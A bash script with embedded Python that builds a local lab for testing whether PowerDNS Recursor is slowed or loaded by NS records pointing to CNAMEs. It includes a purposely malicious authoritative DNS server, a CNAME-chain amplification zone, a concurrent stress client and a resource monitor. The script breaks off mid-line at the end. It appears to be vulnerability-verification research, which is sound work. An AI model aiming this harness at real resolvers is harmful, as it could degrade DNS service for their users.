#!/usr/bin/env bash
set -euo pipefail

# ═══════════════════════════════════════════════════════════════════════
#  PowerDNS Recursor NS→CNAME 攻击验证
#  ─ 三角色架构：权威服务器 + 递归解析器 + 客户端
#  ─ 验证 NS→CNAME 缺陷是否导致时间延迟、资源消耗
# ═══════════════════════════════════════════════════════════════════════

WORKDIR=/workspace/output/pdns-attack-verify
mkdir -p "$WORKDIR"

PDNS_BIN=/workspace/output/pdns-recursor-binary-baseline
PDNS_INSTALL=/workspace/output/pdns-install-baseline
export LD_LIBRARY_PATH="$PDNS_INSTALL/lib:${LD_LIBRARY_PATH:-}"

echo "=========================================================="
echo "  PowerDNS Recursor NS→CNAME Attack Verification"
echo "=========================================================="
echo "Binary: $PDNS_BIN"

# ─── Install dependencies FIRST ──────────────────────────────────────
echo "Installing runtime dependencies..."
apt-get update -qq 2>/dev/null
apt-get install -y --no-install-recommends \
  dnsutils python3 python3-pip procps iproute2 \
  liblua5.3-0 libboost-context1.74.0 libboost-system1.74.0 \
  libboost-filesystem1.74.0 libboost-program-options1.74.0 \
  libboost-regex1.74.0 libprotobuf23 libsodium23 libfstrm0 \
  libcurl4 libyaml-cpp0.7 libsystemd0 \
  2>&1 | tail -5
pip3 install -q dnslib 2>/dev/null || true

# Verify binary runs
echo "Verifying PowerDNS Recursor binary..."
$PDNS_BIN --version 2>&1 | head -1 || { echo "FATAL: pdns_recursor binary failed to start"; exit 1; }
echo ""

# ═══════════════════════════════════════════════════════════════════════
#  1. 权威 DNS 服务器 (Authoritative Server) — Python 脚本
#     监听 127.0.0.1:10053，提供两个域：
#     - attack.com:  NS 记录指向 ns.attack.com，但 ns.attack.com 是 CNAME
#     - normal.com:  NS 记录指向 ns.normal.com，ns.normal.com 是 A 记录（对照组）
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/auth_server.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Malicious Authoritative DNS Server for NS→CNAME attack demo.
Serves zones where NS targets are CNAME records (RFC 2181 §10.3 violation).
"""
import socket
import struct
import time
import threading
import sys
import os

# ─── DNS wire helpers ────────────────────────────────────────────────
def dns_name_encode(name):
    """Encode a DNS name into wire format."""
    parts = name.rstrip('.').split('.')
    result = b''
    for p in parts:
        result += bytes([len(p)]) + p.encode()
    result += b'\x00'
    return result

def dns_name_decode(data, offset):
    """Decode a DNS name, handling compression pointers."""
    parts = []
    jumped = False
    original_offset = offset
    max_offset = offset
    while True:
        if offset >= len(data):
            break
        length = data[offset]
        if length == 0:
            offset += 1
            if not jumped:
                max_offset = offset
            break
        if (length & 0xC0) == 0xC0:  # compression pointer
            if not jumped:
                max_offset = offset + 2
            pointer = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            offset = pointer
            jumped = True
            continue
        offset += 1
        parts.append(data[offset:offset+length].decode())
        offset += length
    return '.'.join(parts), max_offset if jumped else offset

RR_TYPE_A     = 1
RR_TYPE_NS    = 2
RR_TYPE_CNAME = 5
RR_TYPE_SOA   = 6
RR_CLASS_IN   = 1

def make_rr(name, rtype, rclass, ttl, rdata):
    """Build a DNS resource record in wire format."""
    return dns_name_encode(name) + struct.pack('!HHI', rtype, rclass, ttl) + \
           struct.pack('!H', len(rdata)) + rdata

def make_soa_rdata(mname, rname, serial, refresh, retry, expire, minimum):
    return dns_name_encode(mname) + dns_name_encode(rname) + \
           struct.pack('!IIIII', serial, refresh, retry, expire, minimum)

def make_a_rdata(ip):
    return socket.inet_aton(ip)

def make_cname_rdata(target):
    return dns_name_encode(target)

def make_ns_rdata(target):
    return dns_name_encode(target)

# ─── Zone definitions ────────────────────────────────────────────────
# Attack zone: NS record points to a CNAME
ATTACK_ZONE = {
    'origin': 'attack.com.',
    'soa': ('ns.attack.com.', 'admin.attack.com.', 2024100801, 3600, 900, 604800, 86400),
    'ns': ['ns.attack.com.'],         # This NS target is a CNAME!
    'records': {
        'ns.attack.com.':    [('CNAME', 'real.attack.com.', 300)],   # VIOLATION
        'real.attack.com.':  [('A', '10.0.0.1', 300)],
        'www.attack.com.':   [('A', '10.0.0.2', 300)],
    }
}

# Normal zone: NS record points to an A record (control)
NORMAL_ZONE = {
    'origin': 'normal.com.',
    'soa': ('ns.normal.com.', 'admin.normal.com.', 2024100801, 3600, 900, 604800, 86400),
    'ns': ['ns.normal.com.'],
    'records': {
        'ns.normal.com.':    [('A', '10.0.1.1', 300)],   # CORRECT
        'www.normal.com.':   [('A', '10.0.1.2', 300)],
    }
}

# CNAME chain zone: NS → CNAME → CNAME → ... (long chain, amplification)
CHAIN_ZONE = {
    'origin': 'chain.com.',
    'soa': ('ns.chain.com.', 'admin.chain.com.', 2024100801, 3600, 900, 604800, 86400),
    'ns': ['ns.chain.com.'],
    'records': {}
}
# Build a 10-level CNAME chain: ns → c1 → c2 → ... → c9 → A
CHAIN_ZONE['records']['ns.chain.com.'] = [('CNAME', 'c1.chain.com.', 300)]
for i in range(1, 10):
    next_name = f'c{i+1}.chain.com.' if i < 9 else 'final.chain.com.'
    CHAIN_ZONE['records'][f'c{i}.chain.com.'] = [('CNAME', next_name, 300)]
CHAIN_ZONE['records']['final.chain.com.'] = [('A', '10.0.2.1', 300)]

ZONES = {
    'attack.com.': ATTACK_ZONE,
    'normal.com.': NORMAL_ZONE,
    'chain.com.':  CHAIN_ZONE,
}

# ─── Query counters ──────────────────────────────────────────────────
query_count = 0
query_count_lock = threading.Lock()
zone_query_counts = {}
zone_query_lock = threading.Lock()

def record_query(zone_name):
    with zone_query_lock:
        zone_query_counts[zone_name] = zone_query_counts.get(zone_name, 0) + 1

# ─── Build DNS response ─────────────────────────────────────────────
def build_response(query_data, query_name, qtype, zone):
    """Build DNS response for a query."""
    # Parse query header
    txn_id = struct.unpack('!H', query_data[0:2])[0]
    flags = struct.unpack('!H', query_data[2:4])[0]
    qdcount = struct.unpack('!H', query_data[4:6])[0]

    # Build response header
    resp_flags = 0x8400  # QR=1, AA=1, RCODE=0
    ancount = 0
    nscount = 0
    arcount = 0
    authority_rrs = b''
    additional_rrs = b''
    answer_rrs = b''

    origin = zone['origin']

    # Add SOA to authority section for all responses
    soa_mname, soa_rname, serial, refresh, retry, expire, minimum = zone['soa']
    soa_rdata = make_soa_rdata(soa_mname, soa_rname, serial, refresh, retry, expire, minimum)
    authority_rrs += make_rr(origin, RR_TYPE_SOA, RR_CLASS_IN, minimum, soa_rdata)
    nscount += 1

    # Add NS records to authority
    for ns_target in zone['ns']:
        ns_rdata = make_ns_rdata(ns_target)
        authority_rrs += make_rr(origin, RR_TYPE_NS, RR_CLASS_IN, 3600, ns_rdata)
        nscount += 1

    # Answer section
    qname_lower = query_name.lower().rstrip('.') + '.'
    if qname_lower in zone['records']:
        for rtype, rvalue, rttl in zone['records'][qname_lower]:
            if rtype == 'A' and qtype == RR_TYPE_A:
                rdata = make_a_rdata(rvalue)
                answer_rrs += make_rr(query_name, RR_TYPE_A, RR_CLASS_IN, rttl, rdata)
                ancount += 1
            elif rtype == 'CNAME' and (qtype == RR_TYPE_A or qtype == RR_TYPE_CNAME):
                rdata = make_cname_rdata(rvalue)
                answer_rrs += make_rr(query_name, RR_TYPE_CNAME, RR_CLASS_IN, rttl, rdata)
                ancount += 1
                # If asking for A, also follow CNAME chain
                if qtype == RR_TYPE_A:
                    target = rvalue.lower().rstrip('.') + '.'
                    while target in zone['records']:
                        recs = zone['records'][target]
                        if recs[0][0] == 'CNAME':
                            rdata2 = make_cname_rdata(recs[0][1])
                            answer_rrs += make_rr(target.rstrip('.'), RR_TYPE_CNAME, RR_CLASS_IN, recs[0][2], rdata2)
                            ancount += 1
                            target = recs[0][1].lower().rstrip('.') + '.'
                        elif recs[0][0] == 'A':
                            rdata2 = make_a_rdata(recs[0][1])
                            answer_rrs += make_rr(target.rstrip('.'), RR_TYPE_A, RR_CLASS_IN, recs[0][2], rdata2)
                            ancount += 1
                            break
                        else:
                            break
            elif rtype == 'NS' and qtype == RR_TYPE_NS:
                rdata = make_ns_rdata(rvalue)
                answer_rrs += make_rr(query_name, RR_TYPE_NS, RR_CLASS_IN, rttl, rdata)
                ancount += 1
    elif qname_lower == origin.lower():
        # Query for zone apex
        if qtype == RR_TYPE_NS:
            for ns_target in zone['ns']:
                ns_rdata = make_ns_rdata(ns_target)
                answer_rrs += make_rr(origin, RR_TYPE_NS, RR_CLASS_IN, 3600, ns_rdata)
                ancount += 1
        elif qtype == RR_TYPE_SOA:
            soa_rdata2 = make_soa_rdata(soa_mname, soa_rname, serial, refresh, retry, expire, minimum)
            answer_rrs += make_rr(origin, RR_TYPE_SOA, RR_CLASS_IN, minimum, soa_rdata2)
            ancount += 1

    # Add glue records in additional section
    for ns_target in zone['ns']:
        ns_lower = ns_target.lower().rstrip('.') + '.'
        if ns_lower in zone['records']:
            for rtype, rvalue, rttl in zone['records'][ns_lower]:
                if rtype == 'A':
                    ardata = make_a_rdata(rvalue)
                    additional_rrs += make_rr(ns_target, RR_TYPE_A, RR_CLASS_IN, rttl, ardata)
                    arcount += 1
                elif rtype == 'CNAME':
                    # Note: CNAME for NS is a protocol violation!
                    # We intentionally serve this for the attack demo
                    crdata = make_cname_rdata(rvalue)
                    additional_rrs += make_rr(ns_target, RR_TYPE_CNAME, RR_CLASS_IN, rttl, crdata)
                    arcount += 1

    # Assemble response
    header = struct.pack('!HHHHHH', txn_id, resp_flags, 1, ancount, nscount, arcount)
    # Copy question section
    question = query_data[12:]
    response = header + question + answer_rrs + authority_rrs + additional_rrs
    return response

def handle_query(data, addr, sock):
    """Handle a DNS query."""
    global query_count
    try:
        # Parse question
        qname, qoffset = dns_name_decode(data, 12)
        qtype = struct.unpack('!H', data[qoffset:qoffset+2])[0]

        with query_count_lock:
            query_count += 1
            cur = query_count

        # Determine which zone
        zone_name = qname.lower()
        # Find matching zone
        matched_zone = None
        for zname, zdata in ZONES.items():
            if zone_name.endswith(zname.rstrip('.')):
                matched_zone = zdata
                record_query(zname)
                break

        if matched_zone:
            response = build_response(data, qname, qtype, matched_zone)
            sock.sendto(response, addr)
        else:
            # REFUSED
            txn_id = struct.unpack('!H', data[0:2])[0]
            resp = struct.pack('!HHHHHH', txn_id, 0x8405, 1, 0, 0, 0) + data[12:]
            sock.sendto(resp, addr)
    except Exception as e:
        pass  # Silently ignore malformed queries

def run_auth_server(port=10053):
    """Run the authoritative DNS server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    print(f"[AUTH] Authoritative DNS server listening on 127.0.0.1:{port}")
    print(f"[AUTH] Serving zones: {', '.join(ZONES.keys())}")
    sys.stdout.flush()

    while True:
        try:
            data, addr = sock.recvfrom(4096)
            handle_query(data, addr, sock)
        except Exception as e:
            print(f"[AUTH] Error: {e}", file=sys.stderr)
            sys.stderr.flush()

# ─── TCP support for AXFR/larger responses ──────────────────────────
def run_auth_server_tcp(port=10053):
    """Run TCP authoritative DNS server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(5)
    while True:
        try:
            conn, addr = sock.accept()
            data = conn.recv(4096)
            if len(data) < 2:
                conn.close()
                continue
            msg_len = struct.unpack('!H', data[:2])[0]
            msg_data = data[2:2+msg_len]
            qname, qoffset = dns_name_decode(msg_data, 12)
            qtype = struct.unpack('!H', msg_data[qoffset:qoffset+2])[0]
            zone_name = qname.lower()
            matched_zone = None
            for zname, zdata in ZONES.items():
                if zone_name.endswith(zname.rstrip('.')):
                    matched_zone = zdata
                    break
            if matched_zone:
                response = build_response(msg_data, qname, qtype, matched_zone)
                conn.sendall(struct.pack('!H', len(response)) + response)
            conn.close()
        except:
            pass

if __name__ == '__main__':
    # Start UDP
    t_udp = threading.Thread(target=run_auth_server, daemon=True)
    t_udp.start()
    # Start TCP
    t_tcp = threading.Thread(target=run_auth_server_tcp, daemon=True)
    t_tcp.start()
    print("[AUTH] Servers ready (UDP + TCP)")
    sys.stdout.flush()
    # Keep alive
    while True:
        time.sleep(1)
PYEOF

# ═══════════════════════════════════════════════════════════════════════
#  2. PowerDNS Recursor 配置
#     监听 127.0.0.1:5354，将 attack.com/normal.com/chain.com 转发到权威服务器
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/recursor.yml" << YMLEOF
---
incoming:
  port: 5354
  listen:
    - 127.0.0.1
logging:
  loglevel: 6
YMLEOF

cp "$WORKDIR/recursor.yml" "$WORKDIR/recursor-recursor.yml.conf"

# ═══════════════════════════════════════════════════════════════════════
#  3. 客户端攻击脚本 — 对比测量
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/client_test.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Client attack test for NS→CNAME defect in PowerDNS Recursor.
Measures: latency, query count, success/failure rate, timeout rate.
"""
import socket
import struct
import time
import sys
import json
import os

RESULTS_FILE = '/workspace/output/pdns-attack-verify/results.json'

def dns_name_encode(name):
    parts = name.rstrip('.').split('.')
    result = b''
    for p in parts:
        result += bytes([len(p)]) + p.encode()
    result += b'\x00'
    return result

def build_query(name, qtype=1, rd=1):
    """Build a DNS query packet."""
    import random
    txn_id = random.randint(1, 65535)
    flags = 0x0100 if rd else 0x0000  # RD=1
    header = struct.pack('!HHHHHH', txn_id, flags, 1, 0, 0, 0)
    question = dns_name_encode(name) + struct.pack('!HH', qtype, 1)  # QTYPE, QCLASS=IN
    return header + question, txn_id

def send_query(name, server='127.0.0.1', port=5354, qtype=1, timeout=5, use_tcp=False):
    """Send DNS query and measure latency."""
    data, txn_id = build_query(name, qtype)
    start = time.time()

    try:
        if use_tcp:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((server, port))
            sock.sendall(struct.pack('!H', len(data)) + data)
            resp_len_data = sock.recv(2)
            resp_len = struct.unpack('!H', resp_len_data)[0]
            resp = b''
            while len(resp) < resp_len:
                chunk = sock.recv(resp_len - len(resp))
                if not chunk:
                    break
                resp += chunk
            sock.close()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(data, (server, port))
            resp, _ = sock.recvfrom(4096)
            sock.close()

        elapsed = time.time() - start

        # Parse response
        if len(resp) < 12:
            return {'success': False, 'error': 'truncated', 'latency': elapsed}

        r_txn_id = struct.unpack('!H', resp[0:2])[0]
        r_flags = struct.unpack('!H', resp[2:4])[0]
        rcode = r_flags & 0xF
        qdcount = struct.unpack('!H', resp[4:6])[0]
        ancount = struct.unpack('!H', resp[6:8])[0]

        return {
            'success': True,
            'latency': elapsed,
            'rcode': rcode,
            'answer_count': ancount,
            'txn_id_match': r_txn_id == txn_id
        }
    except socket.timeout:
        elapsed = time.time() - start
        return {'success': False, 'error': 'timeout', 'latency': elapsed}
    except Exception as e:
        elapsed = time.time() - start
        return {'success': False, 'error': str(e), 'latency': elapsed}

def run_test(name, qtype, label, server='127.0.0.1', port=5354, count=20, timeout=3):
    """Run multiple queries and collect stats."""
    print(f"\n{'='*60}")
    print(f"  Test: {label}")
    print(f"  Query: {name} type={qtype}")
    print(f"  Server: {server}:{port}, count={count}, timeout={timeout}s")
    print(f"{'='*60}")

    results = []
    for i in range(count):
        r = send_query(name, server, port, qtype, timeout)
        results.append(r)
        status = "OK" if r.get('success') else r.get('error', '???')
        lat = f"{r.get('latency', 0)*1000:.1f}ms"
        ans = r.get('answer_count', '?')
        rc = r.get('rcode', '?')
        print(f"  [{i+1:3d}/{count}] {status:10s} latency={lat:>10s} answers={ans} rcode={rc}")
        time.sleep(0.1)  # Small delay between queries

    # Compute stats
    latencies = [r['latency'] for r in results if r.get('success')]
    timeouts = sum(1 for r in results if r.get('error') == 'timeout')
    successes = sum(1 for r in results if r.get('success'))

    stats = {
        'label': label,
        'query': name,
        'qtype': qtype,
        'total': count,
        'successes': successes,
        'timeouts': timeouts,
        'failures': count - successes,
        'avg_latency_ms': (sum(latencies)/len(latencies)*1000) if latencies else None,
        'max_latency_ms': (max(latencies)*1000) if latencies else None,
        'min_latency_ms': (min(latencies)*1000) if latencies else None,
        'p95_latency_ms': (sorted(latencies)[int(len(latencies)*0.95)]*1000) if len(latencies) >= 2 else None,
    }
    print(f"\n  Summary: {successes}/{count} success, {timeouts} timeouts")
    if latencies:
        print(f"  Latency: avg={stats['avg_latency_ms']:.1f}ms, max={stats['max_latency_ms']:.1f}ms, "
              f"min={stats['min_latency_ms']:.1f}ms, p95={stats['p95_latency_ms']:.1f}ms")

    return stats

def main():
    all_stats = []
    RECURSOR = '127.0.0.1'
    REC_PORT = 5354
    AUTH_PORT = 10053

    print("\n" + "="*60)
    print("  NS→CNAME Attack Verification - PowerDNS Recursor")
    print("="*60)

    # ─── Test 1: Direct query to authoritative server (baseline) ──────
    print("\n\n>>> Phase 1: Direct authoritative server queries (baseline)")
    s1 = run_test('www.attack.com', 1, 'AUTH: attack.com A (NS→CNAME)',
                  '127.0.0.1', AUTH_PORT, count=5, timeout=3)
    s1['phase'] = 'auth_baseline'
    all_stats.append(s1)

    s2 = run_test('www.normal.com', 1, 'AUTH: normal.com A (NS→A, control)',
                  '127.0.0.1', AUTH_PORT, count=5, timeout=3)
    s2['phase'] = 'auth_baseline'
    all_stats.append(s2)

    # ─── Test 2: Through recursor - normal zone (control) ─────────────
    print("\n\n>>> Phase 2: Recursor queries - normal zone (control)")
    s3 = run_test('www.normal.com', 1, 'REC: normal.com A (NS→A, control)',
                  RECURSOR, REC_PORT, count=20, timeout=5)
    s3['phase'] = 'recursor_control'
    all_stats.append(s3)

    # ─── Test 3: Through recursor - attack zone (NS→CNAME) ────────────
    print("\n\n>>> Phase 3: Recursor queries - attack zone (NS→CNAME)")
    s4 = run_test('www.attack.com', 1, 'REC: attack.com A (NS→CNAME)',
                  RECURSOR, REC_PORT, count=20, timeout=5)
    s4['phase'] = 'recursor_attack'
    all_stats.append(s4)

    # ─── Test 4: Through recursor - CNAME chain zone ─────────────────
    print("\n\n>>> Phase 4: Recursor queries - chain zone (NS→CNAME chain×10)")
    s5 = run_test('www.chain.com', 1, 'REC: chain.com A (NS→CNAME chain×10)',
                  RECURSOR, REC_PORT, count=20, timeout=5)
    s5['phase'] = 'recursor_chain'
    all_stats.append(s5)

    # ─── Test 5: NS query specifically ────────────────────────────────
    print("\n\n>>> Phase 5: NS record queries through recursor")
    s6 = run_test('attack.com', 2, 'REC: attack.com NS (NS→CNAME)',
                  RECURSOR, REC_PORT, count=10, timeout=5)
    s6['phase'] = 'recursor_ns_query'
    all_stats.append(s6)

    s7 = run_test('normal.com', 2, 'REC: normal.com NS (NS→A, control)',
                  RECURSOR, REC_PORT, count=10, timeout=5)
    s7['phase'] = 'recursor_ns_query'
    all_stats.append(s7)

    # ─── Test 6: Stress test - concurrent queries ────────────────────
    print("\n\n>>> Phase 6: Concurrent stress test")
    import concurrent.futures

    for zone_label, qname in [('attack', 'www.attack.com'), ('normal', 'www.normal.com'), ('chain', 'www.chain.com')]:
        print(f"\n  Stress test: {zone_label} zone")
        latencies = []
        errors = 0
        def do_query(_):
            r = send_query(qname, RECURSOR, REC_PORT, 1, timeout=5)
            if r.get('success'):
                return r['latency']
            else:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = list(executor.map(do_query, range(50)))
            for lat in futures:
                if lat is not None:
                    latencies.append(lat)
                else:
                    errors += 1

        stress_stat = {
            'label': f'STRESS: {zone_label} zone (50 concurrent)',
            'phase': 'stress',
            'zone': zone_label,
            'total': 50,
            'successes': len(latencies),
            'failures': errors,
            'avg_latency_ms': (sum(latencies)/len(latencies)*1000) if latencies else None,
            'max_latency_ms': (max(latencies)*1000) if latencies else None,
            'min_latency_ms': (min(latencies)*1000) if latencies else None,
        }
        all_stats.append(stress_stat)
        print(f"  Results: {len(latencies)}/50 success, {errors} failures")
        if latencies:
            print(f"  Latency: avg={stress_stat['avg_latency_ms']:.1f}ms, max={stress_stat['max_latency_ms']:.1f}ms")

    # ─── Save results ─────────────────────────────────────────────────
    with open(RESULTS_FILE, 'w') as f:
        json.dump(all_stats, f, indent=2)
    print(f"\n\nResults saved to {RESULTS_FILE}")

    # ─── Summary comparison ───────────────────────────────────────────
    print("\n\n" + "="*60)
    print("  ATTACK VERIFICATION SUMMARY")
    print("="*60)

    # Compare attack vs control
    ctrl = [s for s in all_stats if s.get('phase') == 'recursor_control']
    atk  = [s for s in all_stats if s.get('phase') == 'recursor_attack']
    chn  = [s for s in all_stats if s.get('phase') == 'recursor_chain']

    print(f"\n  {'Metric':<30s} {'Control':>12s} {'Attack':>12s} {'Chain':>12s}")
    print(f"  {'-'*30} {'-'*12} {'-'*12} {'-'*12}")

    if ctrl and atk:
        c = ctrl[0]
        a = atk[0]
        ch = chn[0] if chn else {}

        def fmt(v):
            return f"{v:.1f}" if v is not None else "N/A"

        print(f"  {'Success rate':<30s} {fmt(c.get('successes',0)/c.get('total',1)*100)}% "
              f"{fmt(a.get('successes',0)/a.get('total',1)*100)}% "
              f"{fmt(ch.get('successes',0)/ch.get('total',1)*100 if ch else None)}%")
        print(f"  {'Timeout count':<30s} {c.get('timeouts',0):>12d} {a.get('timeouts',0):>12d} {ch.get('timeouts',0):>12d}")
        print(f"  {'Avg latency (ms)':<30s} {fmt(c.get('avg_latency_ms')):>12s} {fmt(a.get('avg_latency_ms')):>12s} {fmt(ch.get('avg_latency_ms')):>12s}")
        print(f"  {'Max latency (ms)':<30s} {fmt(c.get('max_latency_ms')):>12s} {fmt(a.get('max_latency_ms')):>12s} {fmt(ch.get('max_latency_ms')):>12s}")
        print(f"  {'P95 latency (ms)':<30s} {fmt(c.get('p95_latency_ms')):>12s} {fmt(a.get('p95_latency_ms')):>12s} {fmt(ch.get('p95_latency_ms')):>12s}")

        # Determine if attack caused measurable impact
        print("\n  --- Impact Assessment ---")
        c_avg = c.get('avg_latency_ms') or 0
        a_avg = a.get('avg_latency_ms') or 0
        ch_avg = ch.get('avg_latency_ms') or 0

        if a_avg > 0 and c_avg > 0:
            ratio = a_avg / c_avg
            print(f"  Attack/Control latency ratio: {ratio:.2f}x")
            if ratio > 1.5:
                print(f"  ⚠ SIGNIFICANT LATENCY INCREASE detected (>1.5x)")
            elif ratio > 1.1:
                print(f"  ⚠ Moderate latency increase detected (>1.1x)")
            else:
                print(f"  ✓ No significant latency difference")

        if ch_avg > 0 and c_avg > 0:
            ratio = ch_avg / c_avg
            print(f"  Chain/Control latency ratio:  {ratio:.2f}x")
            if ratio > 2.0:
                print(f"  ⚠ SIGNIFICANT CHAIN AMPLIFICATION detected (>2x)")

        # Check success rate
        c_rate = c.get('successes',0) / c.get('total',1) * 100
        a_rate = a.get('successes',0) / a.get('total',1) * 100
        if a_rate < c_rate - 10:
            print(f"  ⚠ ATTACK ZONE has lower success rate ({a_rate:.0f}% vs {c_rate:.0f}%)")

        # Check timeout rate
        a_timeouts = a.get('timeouts', 0)
        c_timeouts = c.get('timeouts', 0)
        if a_timeouts > c_timeouts:
            print(f"  ⚠ ATTACK ZONE has more timeouts ({a_timeouts} vs {c_timeouts})")

    print("\n" + "="*60)

if __name__ == '__main__':
    main()
PYEOF

# ═══════════════════════════════════════════════════════════════════════
#  4. 资源监控脚本 — 捕捉 CPU/内存变化
# ═══════════════════════════════════════════════════════════════════════
cat > "$WORKDIR/resource_monitor.py" << 'PYEOF'
#!/usr/bin/env python3
"""Monitor PowerDNS Recursor resource usage during attack."""
import subprocess
import time
import sys
import json
import os

SAMPLES_FILE = '/workspace/output/pdns-attack-verify/resource_samples.json'
samples = []
pid = None

def find_pdns_pid():
    """Find pdns_recursor PID."""
    try:
        result = subprocess.run(['pgrep', '-f', 'pdns_recursor'],
                              capture_output=True, text=True, timeout=5)
        pids = result.stdout.strip().split('\n')
        for p in pids:
            if p.strip().isdigit():
                return int(p.strip())
    except:
        pass
    # Fallback: try /proc
    for entry in os.listdir('/proc'):
        if entry.isdigit():
            try:
                with open(f'/proc/{entry}/cmdline', 'rb') as f:
                    cmdline = f.read().decode('utf-8', errors='replace')
                if 'pdns_recursor' in cmdline:
                    return int(entry)
            except:
                continue
    return None

def get_process_stats(pid):
    """Get CPU and memory stats for a process."""
    try:
        with open(f'/proc/{pid}/stat', 'r') as f:
            stat = f.read().split()
        with open(f'/proc/{pid}/status', 'r') as f:
            status = f.read()

        # Parse stat
        utime = int(stat[13])
        stime = int(stat[14])
        rss = int(stat[23])  # in pages

        # Parse status for VmRSS
        vm_rss = 0
        threads = 0
        fd_count = 0
        for line in status.split('\n'):
            if line.startswith('VmRSS:'):
                vm_rss = int(line.split()[1])  # kB
            elif line.startswith('Threads:'):
                threads = int(line.split()[1])

        # Count file descriptors
        try:
            fd_count = len(os.listdir(f'/proc/{pid}/fd'))
        except:
            pass

        # Network connections
        net_conns = 0
        try:
            result = subprocess.run(['ss', '-uan'], capture_output=True, text=True, timeout=2)
            for line in result.stdout.split('\n'):
                if f'pid={pid}' in line or True:  # approximate
                    net_conns += 1
        except:
            pass

        return {
            'utime': utime,
            'stime': stime,
            'rss_kb': vm_rss,
            'rss_pages': rss,
            'threads': threads,
            'fd_count': fd_count,
            'timestamp': time.time()
        }
    except Exception as e:
        return {'error': str(e), 'timestamp': time.time()}

def main():
    global pid
    print("[MONITOR] Waiting for pdns_recursor to start...")
    for _ in range(30):
        pid = find_pdns_pid()
        if pid:
            break
        time.sleep(1)

    if not pid:
        print("[MONITOR] ERROR: pdns_recursor not found!")
        sys.exit(1)

    print(f"[MONITOR] Monitoring PID {pid}")
    prev = None

    while True:
        stats = get_process_stats(pid)
        if 'error' not in stats:
            # Calculate CPU usage
            if prev:
                cpu_ticks = (stats['utime'] + stats['stime']) - (prev['utime'] + prev['stime'])
                cpu_pct = cpu_ticks / (stats['timestamp'] - prev['timestamp']) / os.sysconf('SC_CLK_TCK') * 100
                stats['cpu_pct'] = round(cpu_pct, 1)
            else:
                stats['cpu_pct'] = 0.0

            samples.append(stats)
            print(f"[MONITOR] CPU={stats.get('cpu_pct',0):.1f}% RSS={stats['rss_kb']}kB "
                  f"Threads={stats['threads']} FDs={stats['fd_count']}")
            sys.stdout.flush()

            # Save incrementally
            with open(SAMPLES_FILE, 'w') as f:
                json.dump(samples, f, indent=2)

        prev = stats
        time.sleep(0.5)

if __name__ == '__main__':
    main()
PYEOF

# ═══════════════════════════════════════════════════════════════════════
#  5. 运行所有组件
# ═══════════════════════════════════════════════════════════════════════
echo ""
echo "=== Starting 3-role attack verification environment ==="
echo ""

# ─── Start authoritative DNS server ──────────────────────────────────
echo "[1/3] Starting authoritative DNS server on 127.0.0.1:10053 ..."
python3 "$WORKDIR/auth_server.py" > "$WORKDIR/auth_server.log" 2>&1 &
AUTH_PID=$!
sleep 1
if kill -0 $AUTH_PID 2>/dev/null; then
    echo "       OK (PID $AUTH_PID)"
else
    echo "       FAILED!"
    cat "$WORKDIR/auth_server.log"
    exit 1
fi

# ─── Start PowerDNS Recursor ─────────────────────────────────────────
echo "[2/3] Starting PowerDNS Recursor on 127.0.0.1:5354 ..."
mkdir -p /var/run/pdns-recursor 2>/dev/null || true

# Clear any old recursor instances
pkill -f pdns_recursor 2>/dev/null || true
sleep 1

timeout 120 "$PDNS_BIN" --config-dir="$WORKDIR" --daemon=no \
    --allow-from=0.0.0.0/0 \
    --dont-query= \
    --forward-zones="attack.com=127.0.0.1:10053,normal.com=127.0.0.1:10053,chain.com=127.0.0.1:10053" \
    --local-port=5354 \
    --local-address=127.0.0.1 \
    2>&1 | tee "$WORKDIR/recursor.log" &
PDNS_PID=$!
sleep 4

if kill -0 $PDNS_PID 2>/dev/null; then
    echo "       OK (PID $PDNS_PID)"
else
    echo "       FAILED! Checking log:"
    cat "$WORKDIR/recursor.log" | tail -20
    kill $AUTH_PID 2>/dev/null || true
    exit 1
fi

# ─── Start resource monitor ──────────────────────────────────────────
echo "[3/3] Starting resource monitor ..."
python3 "$WORKDIR/resource_monitor.py" > "$WORKDIR/monitor.log" 2>&1 &
MONITOR_PID=$!
sleep 1

# ─── Verify connectivity ────────────────────────────────────────────
echo ""
echo "=== Verifying connectivity ==="

echo "  [Auth] Direct query to authoritative server:"
dig @127.0.0.1 -p 10053 NS attack.com +time=2 2>&1 | head -15 || echo "  (query failed)"
echo ""
echo "  [Auth] Direct query - normal zone:"
dig @127.0.0.1 -p 10053 A www.normal.com +time=2 2>&1 | head -15 || echo "  (query failed)"
echo ""
echo "  [Recursor] Through recursor - normal zone:"
dig @127.0.0.1 -p 5354 A www.normal.com +time=5 2>&1 | head -15 || echo "  (query failed)"
echo ""
echo "  [Recursor] Through recursor - attack zone:"
dig @127.0.0.1 -p 5354 A www.attack.com +time=5 2>&1 | head -15 || echo "  (query failed)"
echo ""
echo "  [Recursor] Through recursor - chain zone:"
dig @127.0.0.1 -p 5354 A www.chain.com +time=5 2>&1 | head -15 || echo "  (query failed)"

# ─── Run full client test ────────────────────────────────────────────
echo ""
echo "=== Running comprehensive client attack test ==="
python3 "$WORKDIR/client_test.py" 2>&1 | tee "$WORKDIR/client_output.log"

# ─── Collect final resource stats ───────────────────────────────────
echo ""
echo "=== Final resource usage ==="
if [ -f "$WORKDIR/resource_samples.json" ]; then
    python3 -c "
import json
with open('$WORKDIR/resource_samples.json') as f:
    samples = json.load(f)
if samples:
    first = samples[0]
    last = samples[-1]
    print(f'  Samples collected: {len(samples)}')
    print(f'  RSS: {first.get(\"rss_kb\", \"?\")}kB -> {last.get(\"rss_kb\", \"?\")}kB')
    if last.get('rss_kb') and first.get('rss_kb'):
